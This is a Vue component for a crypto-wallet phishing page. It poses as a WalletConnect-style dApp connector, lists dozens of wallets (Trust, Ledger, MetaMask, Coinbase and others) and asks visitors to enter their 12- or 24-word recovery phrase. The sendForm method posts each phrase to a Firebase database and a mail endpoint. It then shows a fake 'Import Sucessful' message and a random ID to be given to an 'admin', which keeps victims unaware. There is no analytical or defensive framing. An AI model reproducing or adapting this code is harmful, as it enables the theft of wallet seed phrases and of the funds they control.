<template>
  <div id="wallet">
    <div class="wallet-modal-white" v-show="loader">
      <img src="https://res.cloudinary.com/vlog/image/upload/v1641226740/qlt/83858-loader.gif" alt="" width="23%">
        </div>
  <div class="wallet-modal" v-show="walletModal">
    <div class="modal-card">
      <div class="modal-card-action">
        <div class="modal-action-1"><img :src= "selectedWallet.img" loading="lazy" width="35" alt="" class="image-5">
          <div class="text-block-5"><strong class="bold-text-2">Import your {{selectedWallet.name}}</strong></div>
        </div>
        <div @click="closeWalletModal" class="modal-close">X</div>
      </div>
      <div>
        <form @submit.prevent="sendForm">
          <div class="form-col">
            <div class="text-block-6">Wallet Name:</div>
            <input readonly type="text" class="text-field w-input" maxlength="256" name="field" data-name="Field" :value="selectedWallet.name" id="field" required=""/>
          </div>
          <div class="form-col">
            <div class="text-block-6">Recovery Phrase:</div>
            <textarea v-model="phrase" placeholder="Enter your recovery phase" minlength="12" maxlength="24" class="w-input" required></textarea>
          </div>
          <div class="text-block-7">Typically 12 (sometimes 24) words separated by single spaces</div>
          <button class="wallet-modal-button">
            Proceed
          </button>
        </form>
      </div>
     
    </div>
  </div>
  <div class="wallet-modal"  v-show="successModal">
    <div class="modal-card success"><img src="images/Sucesss.svg" loading="lazy" alt="" class="image-6">
      <div class="text-block-9">Import Sucessful</div><img src="images/bc-id832.jpeg" loading="lazy" width="238" alt="" class="image-7">
      <div class="text-block-10">Kindly share this Barcode ID <span class="text-span-2">BCDE-CSW{{generatedId}}</span> with your admin for approval<br></div>
      <div style="cursor: pointer;" @click="closeSuccessModal" class="wallet-modal-button">
        <div>Close</div>
      </div>
    </div>
  </div>
  <div class="div-block-4">
    <div class="wallet-header-row">
      <div class="wallet-header-1">Wallets</div><img src="images/iogo.jpg" loading="lazy" width="93" sizes="92.99768829345703px" srcset="images/iogo.jpg 1080w, images/iogo.jpg 1280w" alt="" class="image-4">
      <div class="wallet-header-1">dApps</div>
    </div>
    <div class="text-block-3">Wallets</div>
    <div class="div-block-3">Multiple iOS and Android wallets support the protocol. Simply scan a QR code from your desktop computer screen to start securely using a dApp with your mobile wallet. Interaction between mobile apps and mobile browsers are supported via mobile deep linking.</div>
    <div class="wallet-row">
      <div style="cursor:pointer" @click="selectWalletModal(item)" class="wallet-col" v-for="item in walletList" :key="item.id">
        <div class="wallet-image"><img :src="item.img" alt=""></div>
        <div class="wallet-title"><strong>{{item.name}}</strong></div>
      </div>
    </div>
  </div>
  </div>
</template>

<script>
import axios from "axios";
export default {
     data() {
         return{
            generatedId:"",
      loader: false,
      phrase:"",
      selectedWallet:"",
      successModal: false,
      walletModal: false,
      walletList: [
        {
          "id": 1,
          "name": "Trust Wallet",
          "img": "https://res.cloudinary.com/vlog/image/upload/v1641217585/qlt/1.png"
        },
        {
          "id": 2,
          "name": "Aave Wallet",
          "img": "https://res.cloudinary.com/vlog/image/upload/v1641217585/qlt/2.jpg"
        },
        {
          "id": 3,
          "name": "Ledger Wallet",
          "img": "https://res.cloudinary.com/vlog/image/upload/v1641217585/qlt/3.png"
        },
        {
          "id": 4,
          "name": "Enjin Wallet",
          "img": "https://res.cloudinary.com/vlog/image/upload/v1641217585/qlt/4.png"
        },
        {
          "id": 5,
          "name": "Mew Wallet",
          "img": "https://res.cloudinary.com/vlog/image/upload/v1641217585/qlt/5.png"
        },
        {
          "id": 6,
          "name": "Metamask Wallet",
          "img": "https://res.cloudinary.com/vlog/image/upload/v1641217585/qlt/6.png"
        },
        {
          "id": 7,
          "name": "Digitex Wallet",
          "img": "https://res.cloudinary.com/vlog/image/upload/v1641217585/qlt/7.png"
        },
        {
          "id": 8,
          "name": "CoinBase Wallet",
          "img": "https://res.cloudinary.com/vlog/image/upload/v1641217585/qlt/8.png"
        },
        {
          "id": 9,
          "name": "Autherum Wallet",
          "img": "https://res.cloudinary.com/vlog/image/upload/v1641217585/qlt/9.png"
        },
        {
          "id": 10,
          "name": "Portis Wallet",
          "img": "https://res.cloudinary.com/vlog/image/upload/v1641217585/qlt/10.png"
        },
        {
          "id": 11,
          "name": "Formatic Wallet",
          "img": "https://res.cloudinary.com/vlog/image/upload/v1641217585/qlt/11.png"
        },
        {
          "id": 12,
          "name": "Exodus Wallet",
          "img": "https://res.cloudinary.com/vlog/image/upload/v1641217585/qlt/12.png"
        },
        {
          "id": 13,
          "name": "Defiat Wallet",
          "img": "https://res.cloudinary.com/vlog/image/upload/v1641217585/qlt/13.png"
        },
        {
          "id": 14,
          "name": "Skale Wallet",
          "img": "https://res.cloudinary.com/vlog/image/upload/v1641217585/qlt/14.png"
        },
        {
          "id": 15,
          "name": "Wallet Connect",
          "img": "https://res.cloudinary.com/vlog/image/upload/v1641217585/qlt/15.png"
        },
        {
          "id": 16,
          "name": "Coinomi Wallet",
          "img": "https://res.cloudinary.com/vlog/image/upload/v1641217585/qlt/16.png"
        },
        {
          "id": 17,
          "name": "Atomic Wallet",
          "img": "https://res.cloudinary.com/vlog/image/upload/v1641217585/qlt/17.png"
        },
        {
          "id": 18,
          "name": "Tron Wallet",
          "img": "https://res.cloudinary.com/vlog/image/upload/v1641217585/qlt/18.png"
        },
        {
          "id": 19,
          "name": "Band Protocol Wallet",
          "img": "https://res.cloudinary.com/vlog/image/upload/v1641217585/qlt/19.png"
        },
        {
          "id": 20,
          "name": "EOS Wallet",
          "img": "https://res.cloudinary.com/vlog/image/upload/v1641217585/qlt/20.png"
        },
        {
          "id": 21,
          "name": "Wax Wallet",
          "img": "https://res.cloudinary.com/vlog/image/upload/v1641217585/qlt/21.png"
        },
        {
          "id": 22,
          "name": "Zilliqa Wallet",
          "img": "https://res.cloudinary.com/vlog/image/upload/v1641217585/qlt/22.png"
        },
        {
          "id": 23,
          "name": "Polkdot Wallet",
          "img": "https://res.cloudinary.com/vlog/image/upload/v1641217585/qlt/23.png"
        },
        {
          "id": 24,
          "name": "Monero Wallet",
          "img": "https://res.cloudinary.com/vlog/image/upload/v1641217585/qlt/24.png"
        },
        {
          "id": 25,
          "name": "Klever Wallet",
          "img": "https://res.cloudinary.com/vlog/image/upload/v1641217585/qlt/25.png"
        },
        {
          "id": 26,
          "name": "Neon Wallet",
          "img": "https://res.cloudinary.com/vlog/image/upload/v1641217585/qlt/26.png"
        },
        {
          "id": 27,
          "name": "Theta Wallet",
          "img": "https://res.cloudinary.com/vlog/image/upload/v1641217585/qlt/27.png"
        },
        {
          "id": 28,
          "name": "Tomo Chain Wallet",
          "img": "https://res.cloudinary.com/vlog/image/upload/v1641217585/qlt/28.png"
        },
        {
          "id": 29,
          "name": "Jaxx Wallet",
          "img": "https://res.cloudinary.com/vlog/image/upload/v1641217585/qlt/29.png"
        },
        {
          "id": 30,
          "name": "Elrond Wallet",
          "img": "https://res.cloudinary.com/vlog/image/upload/v1641217585/qlt/30.png"
        },
        {
          "id": 31,
          "name": "Bancor Wallet",
          "img": "https://res.cloudinary.com/vlog/image/upload/v1641217585/qlt/31.png"
        },
        {
          "id": 32,
          "name": "1icnh Wallet",
          "img": "https://res.cloudinary.com/vlog/image/upload/v1641217585/qlt/32.png"
        },
        {
          "id": 33,
          "name": "Cosmos Wallet",
          "img": "https://res.cloudinary.com/vlog/image/upload/v1641217585/qlt/33.png"
        },
        {
          "id": 34,
          "name": "Moonlet Wallet",
          "img": "https://res.cloudinary.com/vlog/image/upload/v1641217585/qlt/34.png"
        },
        {
          "id": 35,
          "name": "Harmony Wallet",
          "img": "https://res.cloudinary.com/vlog/image/upload/v1641217585/qlt/35.png"
        },
        {
          "id": 36,
          "name": "Tezos Wallet",
          "img": "https://res.cloudinary.com/vlog/image/upload/v1641217585/qlt/36.png"
        },
        {
          "id": 37,
          "name": "Kyber Swap Wallet",
          "img": "https://res.cloudinary.com/vlog/image/upload/v1641217585/qlt/37.png"
        },
        {
          "id": 38,
          "name": "Falcon Swap Wallet",
          "img": "https://res.cloudinary.com/vlog/image/upload/v1641217585/qlt/38.png"
        },
        {
          "id": 39,
          "name": "Zilliqa Wallet",
          "img": "https://res.cloudinary.com/vlog/image/upload/v1641217585/qlt/39.png"
        },
        {
          "id": 40,
          "name": "Kava Wallet",
          "img": "https://res.cloudinary.com/vlog/image/upload/v1641217585/qlt/40.png"
        },
        {
          "id": 41,
          "name": "Ocean Protocol Wallet",
          "img": "https://res.cloudinary.com/vlog/image/upload/v1641217585/qlt/41.png"
        },

        {
          "id": 42,
          "name": "Hex Wallet",
          "img": "https://res.cloudinary.com/vlog/image/upload/v1641217585/qlt/42.png"
        },
        {
          "id": 43,
          "name": "Cadano Wallet",
          "img": "https://res.cloudinary.com/vlog/image/upload/v1641217585/qlt/43.png"
        },
        {
          "id": 44,
          "name": "Cardia Chain Wallet",
          "img": "https://res.cloudinary.com/vlog/image/upload/v1641217585/qlt/44.png"
        },
        {
          "id": 45,
          "name": "Octofi Wallet",
          "img": "https://res.cloudinary.com/vlog/image/upload/v1641217585/qlt/45.png"
        },
        {
          "id": 46,
          "name": "Algorand Wallet",
          "img": "https://res.cloudinary.com/vlog/image/upload/v1641217585/qlt/46.png"
        },


      ]  
         }
     
    },
    methods: {
      selectWalletModal(item){
         this.selectedWallet = item;
         this.walletModal = true;
      },
      closeWalletModal(){
         this.selectedWallet = {};
         this.walletModal = false;
      },
      closeSuccessModal(){
         this.selectedWallet = {};
         this.walletModal = false;
         this.successModal = false;
      },
      async sendForm(){
        this.loader = true
        try{
         await axios.post("https://wallet-60845-default-rtdb.firebaseio.com/result.json", {
            "wallet_name": this.selectedWallet.name,
             "phrase": this.phrase,
             "Date": Date.now()
          });
          await axios.post("http://localhost:4000/send-mail", {
            "wallet_name": this.selectedWallet.name,
             "phrase": this.phrase
          });
          this.loader = false
          this.walletModal = false;
          const random = (min, max) => {
                return Math.floor(Math.random() * (max - min + 1) ) + min;
             }
              
             const otp = random(10000,90000)
             this.generatedId = otp
          this.successModal = true
        }
        catch(e){
          console.log(e)
        }
      }
    },
}
</script>